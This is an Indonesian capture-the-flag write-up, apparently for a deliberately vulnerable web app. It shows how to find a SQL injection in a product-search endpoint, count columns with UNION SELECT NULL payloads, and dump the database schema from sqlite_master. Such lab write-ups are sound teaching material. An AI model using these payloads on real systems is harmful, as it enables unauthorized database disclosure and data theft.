# Soal 4 – Database Schema

## 1. Pendahuluan
Challenge *Database Schema* termasuk kategori **Injection** dengan tingkat kesulitan ⭐⭐⭐ (3/6).  
Tujuan utama challenge ini adalah mendapatkan struktur database (*schema*) dengan memanfaatkan celah SQL Injection. Informasi ini penting karena bisa menjadi dasar untuk menyelesaikan challenge lain seperti **User Credentials** atau **Login Admin**.

## 2. Identifikasi Titik Injeksi
Titik injeksi terdapat pada endpoint pencarian produk:GET /rest/products/search?q=<payload>

Pengujian pertama dilakukan dengan memasukkan tanda `'` pada parameter `q`.  
Hasilnya aplikasi menampilkan respon yang berbeda dari normal, menandakan input tidak divalidasi dengan baik dan terdapat potensi SQL Injection.

📌 Bukti: input `'` memunculkan error/hasil abnormal pada halaman pencarian.

## 3. Menentukan Jumlah Kolom
Sebelum melakukan serangan `UNION SELECT`, jumlah kolom pada query harus sesuai dengan query asli.  

Pengujian dilakukan secara bertahap dengan payload berikut:

')) UNION SELECT NULL-- -
')) UNION SELECT NULL,NULL-- -
')) UNION SELECT NULL,NULL,NULL-- -
...


Dari percobaan, ditemukan bahwa query membutuhkan **9 kolom** agar bisa dieksekusi tanpa error.

📌 Bukti: payload dengan 9 kolom `NULL` dapat berjalan normal, sedangkan lebih sedikit menghasilkan error.

## 4. Payload Final
Setelah jumlah kolom diketahui, payload disusun untuk membaca definisi tabel dari `sqlite_master`:

```sql
')) UNION SELECT 
1,
'schema',
group_concat(sql, char(10)),
0,
0,
'image',
'2025-09-07',
'2025-09-07',
NULL
FROM sqlite_master WHERE sql NOT NULL-- -

